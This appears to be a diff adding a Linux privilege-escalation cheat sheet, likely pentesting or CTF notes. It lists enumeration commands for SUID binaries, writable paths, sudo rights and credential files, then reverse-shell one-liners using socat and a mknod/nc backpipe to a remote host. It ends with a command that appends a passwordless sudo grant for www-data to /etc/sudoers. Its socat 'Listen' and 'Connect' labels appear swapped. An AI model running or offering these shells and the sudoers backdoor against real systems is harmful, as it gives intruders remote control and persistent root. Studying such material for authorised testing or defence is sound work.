@@ -1,0 +1,67 @@
+
+    Find World Writable Folders
+    find / -xdev -type d -perm -0002 -ls 2> /dev/null
+    =====================================================
+    Find World Writable Files
+    find / -xdev -type f -perm -0002 -ls 2> /dev/null
+===========================================================
+    Find SUIDs
+    find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
+==================================================================
+    Find SGID
+    find / -perm -2000 -group root -exec ls -ld {} \; 2> /dev/null
+=====================================================================
+    DIstro Information
+    cat /etc/*-release
+=======================================================================
+    Check open ports
+    netstat -antup
+===================================
+    Check processes
+    ps -elf
+============================================
+    Check processes running with root privileges
+    ps -elf | grep root
+==============================================
+    Check running services
+    cat /etc/services
+=============================================
+    Check installed packages
+    dpkg -l
+    rpm -qa
+=================================================
+    Check for sudo permissions
+    sudo -l
+=================================================
+    Check OS architecture
+    uname -a
+====================================================
+    Check cronjobs
+    cat /etc/cron*
+=======================================================
+    Check fstab
+
+    cat /etc/fstab
+================================================
+    Check network configuration
+    ip addr
+================================================
+    Check contents of /etc/passwd
+    cat /etc/passwd
+===================================================
+    Using socat
+        Listen
+          $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+        Connect
+          $ socat file:`tty`,raw,echo=0 tcp-listen:4444
+=============================================================================
+    Reverse connection using mknod
+    mknod /tmp/backpipe p; /bin/sh 0< /tmp/backpipe | nc <ip> <port> 1> /tmp/backpipe; rm /tmp/backpipe
+========================================================================================================
+    Check version of an installed application
+    dpkg -l <application name>
+==============================================================
+    Sometimes checking /opt /tmp /var /usr might help.
+    Edit sudoers file and grant sudo access to the current user (www-data in this case) with no password
+    echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers
+
